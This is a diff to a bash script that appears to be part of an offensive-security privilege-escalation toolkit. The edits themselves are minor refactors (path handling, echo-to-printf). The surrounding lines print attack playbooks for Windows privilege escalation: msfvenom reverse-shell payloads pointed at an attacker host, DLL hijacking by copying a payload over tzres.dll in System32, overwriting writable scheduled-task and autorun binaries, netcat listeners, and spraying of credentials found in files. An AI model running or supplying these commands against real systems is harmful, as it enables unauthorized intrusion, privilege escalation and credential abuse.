@@ -47,7 +47,15 @@ set -o pipefail
 #------------------------------------------------------------------------------
 # CONFIGURATION
 #------------------------------------------------------------------------------
-TOOLKIT_ROOT="${TOOLKIT_ROOT:-${HOME}/offsec}"
+if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
+    if [[ -n "${SUDO_USER:-}" ]]; then
+        _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
+        TOOLKIT_ROOT="${_inv_home:-$HOME}/offsec"
+        unset _inv_home
+    else
+        TOOLKIT_ROOT="${HOME}/offsec"
+    fi
+fi
 PRIVESC_DIR="${TOOLKIT_ROOT}/privesc"         # Base output directory
 TOOLS_CACHE="$HOME/.offsec_tools/privesc"    # Cached tool downloads
 HTTP_PORT=8888                             # HTTP server port for tool serving
@@ -1116,7 +1124,9 @@ CEOF
             echo "[ CREDENTIALS FOUND IN FILES ]"
             echo "------------------------------------------------------------"
             echo "# Plaintext credentials found — test and spray:"
-            echo "${cred_file_hits}" | sed 's/^/  /'
+            while IFS= read -r cred_file_line; do
+                printf '  %s\n' "$cred_file_line"
+            done <<< "${cred_file_hits}"
             echo ""
             echo "# Validate immediately:"
             echo "./sprayr.sh -u <USER> -p '<FOUND_PASSWORD>' -t <TARGET_IP>"
@@ -1344,7 +1354,7 @@ parse_windows_output() {
             echo ".\\smve.exe"
             echo "# Then DLL hijack a SYSTEM service — example with tzres.dll:"
             echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f dll -o tzres.dll"
-            echo "copy tzres.dll C:\\Windows\\System32\\wbem\\tzres.dll"
+            printf '%s\n' "copy tzres.dll C:\\Windows\\System32\\wbem\\tzres.dll"
             echo "# Trigger: run systeminfo (loads tzres.dll)"
             echo "nc -lvnp 4444"
             echo ""
@@ -1356,10 +1366,10 @@ parse_windows_output() {
             echo "------------------------------------------------------------"
             echo "# Find scheduled task running as SYSTEM with a writable binary:"
             echo "schtasks /query /fo LIST /v | findstr /i 'Task To Run\\|Run As\\|Status'"
-            echo "# Check binary permissions: icacls C:\\path\\to\\task\\binary.exe"
+            printf '%s\n' "# Check binary permissions: icacls C:\\path\\to\\task\\binary.exe"
             echo "# If writable (F or M for Users/Everyone):"
             echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o task.exe"
-            echo "copy task.exe C:\\path\\to\\task\\binary.exe /y"
+            printf '%s\n' "copy task.exe C:\\path\\to\\task\\binary.exe /y"
             echo "# Wait for task trigger, or force run:"
             echo "schtasks /run /tn '<TASK_NAME>'"
             echo "nc -lvnp 4444"
@@ -1376,7 +1386,7 @@ parse_windows_output() {
             echo "# For each writable binary: icacls <PATH>"
             echo "# If writable (F or M for Users):"
             echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o update.exe"
-            echo "copy update.exe C:\\path\\to\\autorun\\binary.exe /y"
+            printf '%s\n' "copy update.exe C:\\path\\to\\autorun\\binary.exe /y"
             echo "# Trigger: wait for logon/reboot, or"
             echo "shutdown /r /t 0"
             echo "nc -lvnp 4444"
@@ -1956,6 +1966,7 @@ main() {
 }
 
 if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
+    # shellcheck disable=SC2317
     return 0 2>/dev/null || exit 0
 fi
 
